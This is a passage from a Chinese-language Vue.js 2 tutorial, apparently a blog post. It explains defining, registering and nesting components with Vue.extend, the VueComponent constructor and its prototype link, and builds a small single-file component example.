![在这里插入图片描述](https://img-blog.csdnimg.cn/b6de87cd2e44480a8cbe1ec82b867ca3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


![在这里插入图片描述](https://img-blog.csdnimg.cn/23762cb8feb340449fb0033abcff0a6d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)




**第二种情况，没有 template：**

没有 template，就编译解析 el 绑定的容器，生成虚拟 DOM，后面就顺着生命周期执行下去。



## 1.20 非单文件组件

### 基本使用

Vue中使用组件的三大步骤：

* 定义组件(创建组件)
* 注册组件
* 使用组件(写组件标签)



**定义组件**

使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；

区别如下：

* el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
* data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。

讲解一下面试小问题：data必须写成函数：

这是 js 底层设计的原因：举个例子

> 对象形式

```js
let data = {
    a: 99,
    b: 100
}

let x = data;
let y = data;
// x 和 y 引用的都是同一个对象，修改 x 的值， y 的值也会改变
x.a = 66;
console.loh(x); // a:66 b:100
console.log(y); // a:66 b:100
```

> 函数形式

```js
function data() {
    return {
        a: 99,
        b: 100
    }
}
let x = data();
let y = data();
console.log(x === y); // false
// 我的理解是函数每调用一次就创建一个新的对象返回给他们
```

> 备注：使用template可以配置组件结构。

创建一个组件案例：Vue.extend() 创建

```html
<script type="text/javascript">
    Vue.config.productionTip = false

    //第一步：创建school组件
    const school = Vue.extend({
        template:`
				<div class="demo">
					<h2>学校名称：{{schoolName}}</h2>
					<h2>学校地址：{{address}}</h2>
					<button @click="showName">点我提示学校名</button>	
    </div>
			`,
        // el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
        data(){
            return {
                schoolName:'尚硅谷',
                address:'北京昌平'
            }
        },
        methods: {
            showName(){
                alert(this.schoolName)
            }
        },
    })

    //第一步：创建student组件
    const student = Vue.extend({
        template:`
				<div>
					<h2>学生姓名：{{studentName}}</h2>
					<h2>学生年龄：{{age}}</h2>
    </div>
			`,
        data(){
            return {
                studentName:'张三',
                age:18
            }
        }
    })

    //第一步：创建hello组件
    const hello = Vue.extend({
        template:`
				<div>	
					<h2>你好啊！{{name}}</h2>
    </div>
			`,
        data(){
            return {
                name:'Tom'
            }
        }
    })
</script>
```

**注册组件**

* 局部注册：靠new Vue的时候传入components选项
* 全局注册：靠Vue.component('组件名',组件)

> 局部注册

```html
<script>
	//创建vm
    new Vue({
        el: '#root',
        data: {
            msg:'你好啊！'
        },
        //第二步：注册组件（局部注册）
        components: {
            school: school,
            student: student
            // ES6简写形式
            // school,
            // student
        }
    })
</script>
```

> 全局注册

```html
<script>
	//第二步：全局注册组件
	Vue.component('hello', hello)
</script>
```

**写组件标签**

```html
<!-- 准备好一个容器-->
<div id="root">
    <hello></hello>
    <hr>
    <h1>{{msg}}</h1>
    <hr>
    <!-- 第三步：编写组件标签 -->
    <school></school>
    <hr>
    <!-- 第三步：编写组件标签 -->
    <student></student>
</div>
```



### **几个注意点：**

关于组件名：

一个单词组成：

* 第一种写法(首字母小写)：school
* 第二种写法(首字母大写)：School

多个单词组成：

* 第一种写法(kebab-case命名)：my-school
* 第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)

>  备注：
>
>  (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
>
>  (2).可以使用name配置项指定组件在开发者工具中呈现的名字。





关于组件标签:

第一种写法：<school></school>

第二种写法：<school/>

> 备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。



一个简写方式：

const school = Vue.extend(options) 可简写为：const school = options



### 组件的嵌套

比较简单，直接展示代码：

```html
<!-- 准备好一个容器-->
<div id="root">

</div>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    //定义student组件
    const student = Vue.extend({
        name:'student',
        template:`
				<div>
					<h2>学生姓名：{{name}}</h2>	
					<h2>学生年龄：{{age}}</h2>	
    </div>
			`,
        data(){
            return {
                name:'尚硅谷',
                age:18
            }
        }
    })

    //定义school组件
    const school = Vue.extend({
        name:'school',
        template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<student></student>
    </div>
			`,
        data(){
            return {
                name:'尚硅谷',
                address:'北京'
            }
        },
        // 注册组件（局部）
        components:{
            student
        }
    })

    //定义hello组件
    const hello = Vue.extend({
        template:`<h1>{{msg}}</h1>`,
        data(){
            return {
                msg:'欢迎来到尚硅谷学习！'
            }
        }
    })

    //定义app组件
    const app = Vue.extend({
        template:`
				<div>	
					<hello></hello>
					<school></school>
    </div>
			`,
        components:{
            school,
            hello
        }
    })

    //创建vm
    new Vue({
        template:'<app></app>',
        el:'#root',
        //注册组件（局部）
        components:{app}
    })
</script>
```



### VueComponent

* school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
* 我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。
* 特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！(这个VueComponent可不是实例对象)
* 关于this指向：
  * 组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
  * new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。
* VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。Vue的实例对象，以后简称vm。

Vue 在哪管理 VueComponent

![在这里插入图片描述](https://img-blog.csdnimg.cn/4039bc27eaff4463be9dd5c037993b77.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)




### 一个重要的内置关系

* 一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype
* 为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

![在这里插入图片描述](https://img-blog.csdnimg.cn/9f3398cb2cfb4b169951adb53236ad60.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)


## 1.21 单文件组件

单文件组件就是将一个组件的代码写在 .vue 这种格式的文件中，webpack 会将 .vue 文件解析成 html,css,js这些形式。

来做个单文件组件的案例：

**School.vue**

```html
<template>
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我提示学校名</button>	
	</div>
</template>

<script>
	 export default {
		name:'School',
		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	}
</script>

<style>
	.demo{
		background-color: orange;
	}
</style>
```

**Student.vue**

```html
<template>
	<div>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生年龄：{{age}}</h2>
	</div>
</template>

<script>
	 export default {
		name:'Student',
		data(){
			return {
				name:'张三',
				age:18
			}
		}
	}
</script>
```

**App.vue**

用来汇总所有的组件(大总管)

```html
<template>
	<div>
		<School></School>
		<Student></Student>
	</div>
</template>

<script>
	//引入组件
	import School from './School.vue'
	import Student from './Student.vue'

	export default {
		name:'App',
		components:{
			School,
			Student
		}
	}
</script>
```

**main.js**

在这个文件里面创建 vue 实例

```js
import App from './App.vue'

new Vue({
	el:'#root',
	template:`<App></App>`,
	components:{App},
})
```

**index.html**

在这写 vue 要绑定的容器

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>练习一下单文件组件的语法</title>
	</head>
	<body>
		<!-- 准备一个容器 -->
		<div id="root"></div>
        <script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="./main.js"></script>
	</body>
</html>
```
